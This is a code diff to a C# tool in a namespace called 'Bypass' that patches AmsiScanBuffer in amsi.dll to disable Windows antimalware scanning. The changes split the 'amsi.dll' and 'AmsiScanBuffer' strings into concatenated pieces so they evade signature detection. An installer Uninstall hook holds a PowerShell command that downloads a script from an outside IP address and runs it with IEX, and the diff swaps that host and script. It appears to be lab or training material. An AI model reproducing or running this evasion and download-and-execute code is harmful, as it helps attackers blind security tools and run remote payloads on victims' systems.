@@ -23,7 +23,7 @@ namespace Bypass
         public static int Patch()
         {
             //Get pointer for the amsi.dll        
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            IntPtr TargetDLL = LoadLibrary("am" + "si" + ".dll");
             if (TargetDLL == IntPtr.Zero)
             {
                 Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer!");
@@ -31,7 +31,7 @@ namespace Bypass
             }
 
             //Get pointer for the AmsiScanBuffer function
-            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
+            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "Amsi" + "ScanBuf" + "fer");
             if (AmsiScanBufrPtr == IntPtr.Zero)
             {
                 Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer!");
@@ -72,7 +72,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.207/Inject.ps1') | IEX";
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.84/injectorsimple.ps1') | IEX";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
 
